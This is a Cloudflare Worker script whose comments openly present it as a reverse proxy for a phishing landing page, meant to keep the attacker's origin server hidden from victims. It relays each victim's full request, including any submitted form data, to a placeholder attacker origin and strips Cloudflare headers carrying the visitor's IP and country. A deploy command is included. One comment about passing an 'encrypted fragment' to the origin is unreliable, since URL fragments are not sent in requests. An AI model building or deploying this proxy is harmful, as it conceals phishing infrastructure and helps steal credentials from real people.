// Cloudflare Worker — Reverse proxy for phishing landing page
// Deploy: npx wrangler deploy
// The origin server IP is never exposed to victims.
// Victims see: your-worker.workers.dev (Cloudflare TLS cert, Cloudflare IP)
// Origin: hidden behind Cloudflare's edge network

const ORIGIN = 'http://YOUR_ORIGIN_IP:9090';

export default {
    async fetch(request, env, ctx) {
        const url = new URL(request.url);

        // Build origin URL — preserve path, query, and fragment
        const originUrl = new URL(ORIGIN);
        originUrl.pathname = url.pathname;
        originUrl.search = url.search;
        originUrl.hash = url.hash; // Critical: pass encrypted fragment through

        const modifiedRequest = new Request(originUrl, {
            method: request.method,
            headers: request.headers,
            body: request.body,
            redirect: 'follow',
        });

        // Strip Cloudflare-specific headers before forwarding
        modifiedRequest.headers.delete('CF-Connecting-IP');
        modifiedRequest.headers.delete('CF-IPCountry');
        modifiedRequest.headers.delete('CF-Ray');
        modifiedRequest.headers.delete('CF-Visitor');

        const response = await fetch(modifiedRequest);
        return response;
    },
};
